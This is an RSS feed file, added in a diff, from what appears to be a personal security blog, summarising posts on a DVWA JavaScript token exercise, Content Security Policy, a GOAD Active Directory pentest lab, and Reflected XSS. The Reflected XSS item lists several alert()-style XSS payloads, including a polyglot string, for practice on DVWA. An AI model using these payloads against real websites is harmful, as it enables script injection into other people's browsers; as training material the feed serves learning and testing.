@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Security on ideas, pronderences and deliberations</title>
+    <link>//localhost:60620/tags/security/</link>
+    <description>Recent content in Security on ideas, pronderences and deliberations</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 17 Feb 2025 16:06:04 +0100</lastBuildDate>
+    <atom:link href="//localhost:60620/tags/security/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>JavaScript</title>
+      <link>//localhost:60620/posts/javascript/</link>
+      <pubDate>Mon, 17 Feb 2025 16:06:04 +0100</pubDate>
+      <guid>//localhost:60620/posts/javascript/</guid>
+      <description>&lt;p&gt;JavaScript is the world&amp;rsquo;s most popular programming langauge. Its prevalence, along with its client-side execution, creates opportunities for various attack vectors. JavaScript to identify and exploit vulnerabilities in web applications, such as Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and some mention of other common security flaws.&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://www.stationx.net/javascript-for-hacking/&#34;&gt;https://www.stationx.net/javascript-for-hacking/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Low:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;To make the token visible remove the &amp;ldquo;hidden&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;This explains for to complete the task . Need to submit the word success and the correct token.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Content Security Policy</title>
+      <link>//localhost:60620/posts/content-security-policy-bypass/</link>
+      <pubDate>Thu, 13 Feb 2025 16:06:04 +0100</pubDate>
+      <guid>//localhost:60620/posts/content-security-policy-bypass/</guid>
+      <description>&lt;p&gt;CSP is a browser security mechanism that aims to mitigate XSS and some other attacks. It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages.&lt;/p&gt;&#xA;&lt;p&gt;To enable CSP, a response needs to include an HTTP response header called Content-Security-Policy with a value containing the policy. The policy itself consists of one or more directives, separated by semicolons.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>GOAD Setup</title>
+      <link>//localhost:60620/posts/goad/</link>
+      <pubDate>Thu, 13 Feb 2025 16:06:04 +0100</pubDate>
+      <guid>//localhost:60620/posts/goad/</guid>
+      <description>&lt;p&gt;GOAD is a simulated Active Directory LAB environment used to execute Windows attacks&#xA;The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques. There are 5 windows servers in total, 3 domain controllers, two MySQL servers. Users and accounts have been populated and the name mimic charachters from a popular TV series.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Using this guide setup your GOAD LAB on your server.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Reflected XSS</title>
+      <link>//localhost:60620/posts/xss-reflected/</link>
+      <pubDate>Tue, 24 Dec 2024 16:06:04 +0100</pubDate>
+      <guid>//localhost:60620/posts/xss-reflected/</guid>
+      <description>&lt;p&gt;Reflected XSS is an injection attack where malicious scripts are sent to a vulnerable web server (often via URLs), and the server immediately includes (reflects) those scripts unsanitized in the HTML response back to the victim&amp;rsquo;s browser, which then executes them. It relies on the server reflecting user input directly into the response page.&lt;/p&gt;&#xA;&lt;p&gt;Examples:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;javascript:/*--&amp;gt;&amp;lt;/title&amp;gt;&amp;lt;/style&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/xmp&amp;gt;&#xA;&amp;lt;svg/onload=&amp;#39;+/&amp;#34;`/+/onmouseover=1/+/[*/[]/+alert(42);//&amp;#39;&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;IMG &amp;#34;&amp;#34;&amp;#34;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&amp;#34;XSS&amp;#34;)&amp;lt;/SCRIPT&amp;gt;&amp;#34;\&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;a href=&amp;#34;javascript:alert(String.fromCharCode(88,83,83))&amp;#34;&amp;gt;Click Me!&amp;lt;/a&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;IMG SRC=# onmouseover=&amp;#34;alert(&amp;#39;xxs&amp;#39;)&amp;#34;&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;IMG SRC=/ onerror=&amp;#34;alert(String.fromCharCode(88,83,83))&amp;#34;&amp;gt;&amp;lt;/img&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;DVWA has 3 settings to show different levels of security. Below are the bypasses for each level.&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
